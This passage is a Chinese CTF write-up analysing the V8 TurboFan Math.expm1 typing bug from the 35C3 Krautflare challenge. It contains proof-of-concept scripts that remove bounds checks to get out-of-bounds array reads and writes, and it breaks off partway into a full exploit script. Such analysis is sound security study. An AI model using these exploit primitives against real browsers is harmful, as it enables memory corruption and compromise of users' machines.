    <published>2019-09-21T09:53:23.000Z</published>
    <updated>2019-09-22T02:09:22.757Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>一道关于v8 turbofan中typer漏洞的题目.构造起来很困难…<br>漏洞出自: <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1710" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1710</a></p><p>主要参考了这篇文章:<br><a href="https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/" target="_blank" rel="noopener">Exploiting the Math.expm1 typing bug in V8</a></p><p>作者写的极其详细…我只是补充下我的一些理解.</p><h3 id="typer出现的问题"><a href="#typer出现的问题" class="headerlink" title="typer出现的问题:"></a>typer出现的问题:</h3><p>typer干的事就是根据input节点等信息给节点标记上可能的Type. 例如给某个函数调用节点标记上可能的返回值类型. 然后后续会根据这些Type进行一些优化.<br>typer会在以下三个阶段运行：</p><blockquote><ul><li>in the typer phase</li><li>in the TypeNarrowingReducer (load elimination phase)</li><li>in the simplified lowering phase</li></ul></blockquote><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> BuiltinFunctionId<span class="type">::kMathExpm1</span>:</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">Type</span><span class="type">::Union</span>(<span class="keyword">Type</span><span class="type">::PlainNumber</span>(), <span class="keyword">Type</span><span class="type">::NaN</span>(), t-&gt;zone());</span><br></pre></td></tr></table></figure><p>typer当遇到Math.Expm1这个builtin函数的时候会给该节点标记上type:<code>Type::Union(Type::PlainNumber(), Type::NaN(), t-&gt;zone());</code>，不包括-0。但实际上Math.Expm1的返回值有可能是-0.</p><p>MDN上关于Math.expm1的描述如下：</p><blockquote><p>Math.expm1() 函数返回 E**x - 1, 其中 x 是该函数的参数, E 是自然对数的底数 2.718281828459045.参数 x 会被自动类型转换成 number 类型.</p></blockquote><p>Math.expm1(-0)的值是-0.<br>可以利用Object.is(Math.expm1(-0),-0)来判断两者是否相同.</p><h3 id="poc分析："><a href="#poc分析：" class="headerlink" title="poc分析："></a>poc分析：</h3><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">(x)</span> &#123;</span></span><br><span class="line">    <span class="keyword">return</span> Object.is(Math.<span class="built_in">expm1</span>(x), <span class="number">-0</span>);</span><br><span class="line">&#125;</span><br><span class="line">console.<span class="built_in">log</span>(foo(<span class="number">0</span>));</span><br><span class="line"><span class="comment">%OptimizeFunctionOnNextCall(foo);</span></span><br><span class="line">foo(<span class="string">"0"</span>);</span><br><span class="line"><span class="comment">%OptimizeFunctionOnNextCall(foo);</span></span><br><span class="line">console.<span class="built_in">log</span>(foo(<span class="number">-0</span>));</span><br></pre></td></tr></table></figure><p>运行脚本会输出false:<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wxy<span class="variable">@ubuntu</span><span class="symbol">:~/krautflare</span><span class="variable">$ </span>./d8 --allow-natives-syntax ./xx.js </span><br><span class="line"><span class="keyword">false</span></span><br></pre></td></tr></table></figure></p><p>观察最后一次优化typer时期的graph:<br><img src="/2019/09/21/35C3-CTF-2018-Krautflare分析/1.png" alt=""><br>Math.Expm1节点Type标记被标记为<code>PlainNumber/NaN</code><br>因为优化器看到一个-0和返回值类型为非-0的节点比较，会认为比较永远为false，则typed lowering阶段中的常量折叠则会直接将SameValue替换成了常数false:<br><img src="/2019/09/21/35C3-CTF-2018-Krautflare分析/2.png" alt=""><br>所以打印的结果为false.</p><p>typer标记的错误类型导致了后续优化器的错误优化，最后生成错误的机器代码。<br><strong>注意Object.is这里正确的比较结果应该是true,打印的结果为false的原因是后续优化器的结果，如果后续优化器不进行常量折叠操作，那么打印的结果仍然是true.</strong></p><p>但poc这里只是输出了错误的结果，并不能造成安全问题. 我们需要利用typer的类型传播，利用simplify lowering阶段的redundancyElimination将数组存取操作之前的CheckBound节点去除，这样就可以进行数组越界访问.</p><h3 id="构造越界访问"><a href="#构造越界访问" class="headerlink" title="构造越界访问:"></a>构造越界访问:</h3><p>参考文章先给出一个脚本作为引例：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">0.1</span>, <span class="number">0.2</span>, <span class="number">0.3</span>, <span class="number">0.4</span>];</span><br><span class="line">    <span class="keyword">let</span> b = <span class="built_in">Object</span>.is(<span class="built_in">Math</span>.expm1(x), <span class="number">-0</span>);</span><br><span class="line">    <span class="keyword">return</span> a[b * <span class="number">1337</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(foo(<span class="number">0</span>));</span><br><span class="line">%OptimizeFunctionOnNextCall(foo);</span><br><span class="line">foo(<span class="string">"0"</span>);</span><br><span class="line">%OptimizeFunctionOnNextCall(foo);</span><br><span class="line"><span class="built_in">console</span>.log(foo(<span class="number">-0</span>));</span><br></pre></td></tr></table></figure></p><p>最后一次运行foo函数时，根据前面的分析，因为编译器<strong>过早</strong>的看见我们在与-0进行比较，typed lowering阶段的常量折叠会直接将SameValue节点折叠成常量false，b的值毋庸置疑是false，那么将访问到a[0].不会发生越界访问。</p><h4 id="理想的构造形式"><a href="#理想的构造形式" class="headerlink" title="理想的构造形式"></a>理想的构造形式</h4><p>让Object.is的返回值为true(这样访问是a[1337]),而且能够利用typer标记的错误Type信息欺骗编译器，让编译器认为Object.is的比较结果为false，将SameValue的Type标记为false，并传播这个类型信息。<br>然后在后续Simplify lowering阶段的redundancyElimination会将CheckBound移除，这样a[1337]就可以发生越界访问(如果CheckBound节点没有移除则会得到undefined，不会造成越界访问)。</p><p>参考文章中给出的 turbofan 优化管道：</p><p><img src="/2019/09/21/35C3-CTF-2018-Krautflare分析/3.png" alt=""></p><p>可以看出在前两次type结束后会进行常量折叠，也就是说如果在前两次type的时候编译器就发现Expm1在跟-0进行比较，那么顺应在其之后的常量折叠就会将SameValue节点直接替换成 常量false，那么Object.is的返回结果就是false，跟我们想要的不一样.<br>我们需要在第三次type的时候才让编译器发现我们在跟-0进行比较。</p><p>Simplify lowering阶段中包括三个阶段:<br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">void <span class="keyword">Run</span>(SimplifiedLowering* lowering) &#123;</span><br><span class="line">    <span class="built_in">RunTruncationPropagationPhase</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">RunTypePropagationPhase</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Run lowering and change insertion phase.</span></span><br><span class="line">    <span class="keyword">TRACE</span>(<span class="string">"--&#123;Simplified lowering phase&#125;--\n"</span>);</span><br><span class="line">    phase_ = <span class="built_in">LOWER</span>;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></p><p>在<code>TypePropagationPhase</code>中会进行type，其中会进行类型传播.</p><p>我们需要在此次type时才让编译器看到我们正在与 -0 进行比较. 这次type过后，SameValue的Type信息会被更改为<code>singleton_false_</code>：<br><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Type</span> OperationTyper<span class="type">::SameValue</span>(<span class="keyword">Type</span> lhs, <span class="keyword">Type</span> rhs) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!JSType(lhs).Maybe(JSType(rhs))) <span class="keyword">return</span> singleton_false();</span><br><span class="line">  <span class="keyword">if</span> (lhs.Is(<span class="keyword">Type</span><span class="type">::NaN</span>())) &#123;</span><br><span class="line">    <span class="keyword">if</span> (rhs.Is(<span class="keyword">Type</span><span class="type">::NaN</span>())) <span class="keyword">return</span> singleton_true();</span><br><span class="line">    <span class="keyword">if</span> (!rhs.Maybe(<span class="keyword">Type</span><span class="type">::NaN</span>())) <span class="keyword">return</span> singleton_false();</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rhs.Is(<span class="keyword">Type</span><span class="type">::NaN</span>())) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!lhs.Maybe(<span class="keyword">Type</span><span class="type">::NaN</span>())) <span class="keyword">return</span> singleton_false();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (lhs.Is(<span class="keyword">Type</span><span class="type">::MinusZero</span>())) &#123;</span><br><span class="line">    <span class="keyword">if</span> (rhs.Is(<span class="keyword">Type</span><span class="type">::MinusZero</span>())) <span class="keyword">return</span> singleton_true();</span><br><span class="line">    <span class="keyword">if</span> (!rhs.Maybe(<span class="keyword">Type</span><span class="type">::MinusZero</span>())) <span class="keyword">return</span> singleton_false(); <span class="comment">//这里返回singleton_false</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rhs.Is(<span class="keyword">Type</span><span class="type">::MinusZero</span>())) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!lhs.Maybe(<span class="keyword">Type</span><span class="type">::MinusZero</span>())) <span class="keyword">return</span> singleton_false();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (lhs.Is(<span class="keyword">Type</span><span class="type">::OrderedNumber</span>()) &amp;&amp; rhs.Is(<span class="keyword">Type</span><span class="type">::OrderedNumber</span>()) &amp;&amp;</span><br><span class="line">      (lhs.<span class="keyword">Max</span>() &lt; rhs.<span class="keyword">Min</span>() || lhs.<span class="keyword">Min</span>() &gt; rhs.<span class="keyword">Max</span>())) &#123;</span><br><span class="line">    <span class="keyword">return</span> singleton_false();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">Type</span><span class="type">::Boolean</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后类型传播，b*1337的Type信息就会是range(0)，而0小于数组的长度4，则redundancyElimination会认为这次存取操作是合法的，就会将CheckBound节点移除. 注意此时type过后没有发生常量折叠，则Object.is的返回结果为true,会访问到a[1337]，成功的得到了越界访问.</p><h4 id="利用逃逸分析绕过前两次type"><a href="#利用逃逸分析绕过前两次type" class="headerlink" title="利用逃逸分析绕过前两次type"></a>利用逃逸分析绕过前两次type</h4><p>按我的理解，函数中发生逃逸的对象是可以被外界所引用. 例如该对象作为函数的返回值.如果函数中某个变量没有发生逃逸，则可以不用在堆中给他分配内存，可以直接在栈中给他分配内存，当函数返回后，该对象就直接清除了,减少了GC的压力.<br>例如：<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title">foo</span>()</span><br><span class="line">&#123;</span><br><span class="line">    let a = &#123;x:1&#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="type">a.x</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>其中对象a没有发生逃逸，则可以优化成:<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title">foo</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="type">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在turbofan的优化管道中，逃逸分析阶段正好在第三次type之前，第二次type之后.<br>看下面的代码:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">0.1</span>, <span class="number">0.2</span>, <span class="number">0.3</span>, <span class="number">0.4</span>];</span><br><span class="line">    <span class="keyword">let</span> o = &#123;<span class="attr">mz</span>: <span class="number">-0</span>&#125;;</span><br><span class="line">    <span class="keyword">let</span> b = <span class="built_in">Object</span>.is(<span class="built_in">Math</span>.expm1(x), o.mz);</span><br><span class="line">    <span class="keyword">return</span> a[b * <span class="number">1337</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(foo(<span class="number">0</span>));</span><br><span class="line">%OptimizeFunctionOnNextCall(foo);</span><br><span class="line">foo(<span class="string">"0"</span>);</span><br><span class="line">%OptimizeFunctionOnNextCall(foo);</span><br><span class="line"><span class="built_in">console</span>.log(foo(<span class="number">-0</span>));</span><br></pre></td></tr></table></figure></p><p>观察最后一次优化生成的graph:</p><p>在逃逸分析之前:<br><img src="/2019/09/21/35C3-CTF-2018-Krautflare分析/4.png" alt=""><br>编译器还是不知道跟expm1比较是什么，SameValue的Type在逃逸分析之前一直都是Boolean，编译器并不知道确切的比较结果.<br>在逃逸分析之后:<br><img src="/2019/09/21/35C3-CTF-2018-Krautflare分析/5.png" alt=""><br>SameValue的左输入节点被优化为常量-0.这样在Simplify lowering中type的时候就可以将SameValue节点type成singleton_false.然后后面就可以将CheckBound节点消除.<br>simplify lowering后的graph:<br><img src="/2019/09/21/35C3-CTF-2018-Krautflare分析/6.png" alt=""><br>可以看到CheckBound节点已经被消除了.</p><h3 id="参考文章给出的越界访问poc出现的问题："><a href="#参考文章给出的越界访问poc出现的问题：" class="headerlink" title="参考文章给出的越界访问poc出现的问题："></a>参考文章给出的越界访问poc出现的问题：</h3><p>参考文章作者给出的poc如下：<br><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o = &#123;mz: -<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> b = Object.<span class="keyword">is</span>(Math.expm<span class="number">1</span>(x), o.mz);</span><br><span class="line"><span class="keyword">let</span> a = [<span class="number">0.1</span>, <span class="number">0.2</span>, <span class="number">0.3</span>, <span class="number">0.4</span>]; <span class="comment">// origin array</span></span><br><span class="line">arrs.push([<span class="number">0.4</span>, <span class="number">0.5</span>]); <span class="comment">// OOB array</span></span><br><span class="line">objs.push(&#123;marker: <span class="number">0</span>x<span class="number">41414141</span>, obj: &#123;&#125;&#125;); <span class="comment">// victim object</span></span><br><span class="line">bufs.push(<span class="keyword">new</span> ArrayBuffer(<span class="number">0</span>x<span class="number">41</span>)); <span class="comment">// victim buffer</span></span><br><span class="line"><span class="keyword">let</span> <span class="keyword">new</span><span class="number">_</span>size = (<span class="keyword">new</span> Int<span class="number">64</span>(<span class="string">"7fffffff00000000"</span>)).asDouble()</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">4</span>; i &lt; <span class="number">20</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> val = a[b*i];</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">is</span><span class="number">_</span>backing = a[b*(i+<span class="number">1</span>)] === <span class="number">0.4</span>;</span><br><span class="line">    <span class="keyword">let</span> orig<span class="number">_</span>size = Int<span class="number">64</span>.fromDouble(val).toString();</span><br><span class="line">    <span class="keyword">let</span> good = (orig<span class="number">_</span>size === <span class="string">"0x0000000200000000"</span> &amp;&amp; !<span class="keyword">is</span><span class="number">_</span>backing);</span><br><span class="line">    a[b*i*good] = <span class="keyword">new</span><span class="number">_</span>size;</span><br><span class="line">    <span class="keyword">if</span> (good)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里引入了good变量，参考文章中的poc是可以成功的进行越界写的.但当我自己写的时候，我改变了逻辑:<br><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(good)</span><br><span class="line">  a[b*i] = <span class="keyword">new</span><span class="type">_size</span>;</span><br></pre></td></tr></table></figure></p><p>没有用good来计算索引值，导致无法越界写…</p><p>我的测试脚本如下:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> conv = <span class="keyword">new</span> convert();</span><br><span class="line"><span class="keyword">let</span> arrs= <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">let</span> bufs= <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">let</span> objs= <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">let</span> o = &#123;<span class="attr">mz</span>:<span class="number">-0</span>&#125;;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">0.1</span> , <span class="number">0.2</span> , <span class="number">0.3</span> , <span class="number">0.4</span>];</span><br><span class="line">    <span class="keyword">let</span> b = <span class="built_in">Object</span>.is(<span class="built_in">Math</span>.expm1(x),o.mz);</span><br><span class="line">    arrs.push([<span class="number">0.4</span>,<span class="number">0.5</span>]);</span><br><span class="line">    objs.push(&#123;<span class="attr">mark</span>:<span class="number">0x41414141</span>,<span class="attr">obj</span>:&#123;&#125;&#125;);</span><br><span class="line">    bufs.push(<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x41</span>));</span><br><span class="line">    <span class="keyword">let</span> i= <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">let</span> len = conv.f2i(a[i*b]);</span><br><span class="line">    <span class="keyword">let</span> is_backing = a[b*(i+<span class="number">1</span>)] === <span class="number">0.4</span>;</span><br><span class="line">    <span class="keyword">let</span> good= (len == <span class="number">0x200000000</span>n &amp;&amp; !is_backing);</span><br><span class="line">    a[b*i*good] = conv.i2f(<span class="number">0x9999999200000000</span>n);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">foo(<span class="number">0</span>);</span><br><span class="line">%OptimizeFunctionOnNextCall(foo);</span><br><span class="line">foo(<span class="string">"0"</span>);</span><br><span class="line">%OptimizeFunctionOnNextCall(foo);</span><br><span class="line"><span class="built_in">console</span>.log(foo(<span class="number">-0</span>));</span><br><span class="line"><span class="built_in">console</span>.log(foo(<span class="number">-0</span>));</span><br></pre></td></tr></table></figure></p><p>这个脚本中使用good变量来计算index值.<br>逃逸分析后的graph如下:<br><img src="/2019/09/21/35C3-CTF-2018-Krautflare分析/7.png" alt=""><br>可以看到SameValue的Type被传播了下去.数组写入操作之前有个CheckBound节点，跟之前分析的Graph基本上相同.这样在Simplify lowering阶段的type就会将SameValue的singleton_false传播过去，然后消除CheckBound节点.</p><p>当不使用good变量作为index时:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> conv = <span class="keyword">new</span> convert();</span><br><span class="line"><span class="keyword">let</span> arrs= <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">let</span> bufs= <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">let</span> objs= <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">let</span> o = &#123;<span class="attr">mz</span>:<span class="number">-0</span>&#125;;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">0.1</span> , <span class="number">0.2</span> , <span class="number">0.3</span> , <span class="number">0.4</span>];</span><br><span class="line">    <span class="keyword">let</span> b = <span class="built_in">Object</span>.is(<span class="built_in">Math</span>.expm1(x),o.mz);</span><br><span class="line">    arrs.push([<span class="number">0.4</span>,<span class="number">0.5</span>]);</span><br><span class="line">    objs.push(&#123;<span class="attr">mark</span>:<span class="number">0x41414141</span>,<span class="attr">obj</span>:&#123;&#125;&#125;);</span><br><span class="line">    bufs.push(<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x41</span>));</span><br><span class="line">    <span class="keyword">let</span> i= <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">let</span> len = conv.f2i(a[i*b]);</span><br><span class="line">    <span class="keyword">let</span> is_backing = a[b*(i+<span class="number">1</span>)] === <span class="number">0.4</span>;</span><br><span class="line">    <span class="keyword">let</span> good= (len == <span class="number">0x200000000</span>n &amp;&amp; !is_backing);</span><br><span class="line">    <span class="keyword">if</span>(good)</span><br><span class="line">        a[b*i] = conv.i2f(<span class="number">0x9999999200000000</span>n);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">foo(<span class="number">0</span>);</span><br><span class="line">%OptimizeFunctionOnNextCall(foo);</span><br><span class="line">foo(<span class="string">"0"</span>);</span><br><span class="line">%OptimizeFunctionOnNextCall(foo);</span><br><span class="line"><span class="built_in">console</span>.log(foo(<span class="number">-0</span>));</span><br><span class="line"><span class="built_in">console</span>.log(foo(<span class="number">-0</span>));</span><br></pre></td></tr></table></figure></p><p>Simplify lowering阶段的graph如下：<br><img src="/2019/09/21/35C3-CTF-2018-Krautflare分析/8.png" alt=""><br>当good为true的时候直接走到了去优化节点…，并没有数组存取等操作..</p><p>通过上面的分析可以了解到SameValue的类型信息需要good变量来进行传递.</p><h3 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本:"></a>利用脚本:</h3><p>参考文章的思路是通过这个越界写数组修改下一个数组的length属性，这样就可以构造出一个稳定oob的数组.</p><p>完整的利用脚本如下:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">convert</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.buf=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">this</span>.uint8array=<span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.float64array=<span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.uint32array=<span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.bitint=<span class="keyword">new</span> BigUint64Array(<span class="keyword">this</span>.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    f2i(x)<span class="comment">//float64 ==&gt; uint64</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.float64array[<span class="number">0</span>]=x;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.bitint[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    i2f(x)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.bitint[<span class="number">0</span>]=BigInt(x);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.float64array[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> conv = <span class="keyword">new</span> convert();</span><br><span class="line"><span class="keyword">let</span> arrs= <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">let</span> bufs= <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">let</span> objs= <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">let</span> o = 